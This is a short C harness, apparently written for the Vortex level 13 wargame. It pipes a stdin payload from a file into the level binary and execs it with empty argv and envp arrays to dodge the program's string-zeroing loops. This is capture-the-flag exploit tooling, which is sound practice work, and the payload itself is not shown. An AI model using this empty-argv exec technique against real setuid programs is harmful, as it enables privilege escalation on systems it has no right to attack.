#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
/* probe13: re-exec /vortex/vortex13 with argv={NULL}, envp={NULL} and a
   stdin payload, so the kernel places the exec path at the bottom of the
   stack and main's zeroing loops see no strings.  The argv/envp holes make
   argc=0; the stdin payload is read by fgets.  A second invocation with a
   flag runs the real probe: this stub execve's the level with the holes
   and passes the stdin through a pipe. */
int main(int argc, char **argv, char **envp) {
    if (argc < 3) {
        fprintf(stderr, "usage: probe13 <stdin-file> <out>\n");
        return 2;
    }
    /* read the stdin payload */
    static unsigned char in[256];
    FILE *f = fopen(argv[1], "rb");
    size_t n = fread(in, 1, sizeof in, f);
    fclose(f);
    /* pipe + fork: child = the level with holes, stdin = the payload */
    int pfd[2];
    pipe(pfd);
    write(pfd[1], in, n);   /* payload before the fork: no race */
    pid_t pid = fork();
    if (pid == 0) {
        close(pfd[1]);
        dup2(pfd[0], 0);
        close(pfd[0]);
        char *av[2] = { NULL, NULL };
        char *ev[1] = { NULL };
        execve("/vortex/vortex13", av, ev);
        _exit(127);
    }
    close(pfd[0]);
    close(pfd[1]);
    int st = 0;
    waitpid(pid, &st, 0);
    fprintf(stderr, "child exit=%d sig=%d\n", WEXITSTATUS(st), WTERMSIG(st));
    (void)envp;
    return 0;
}
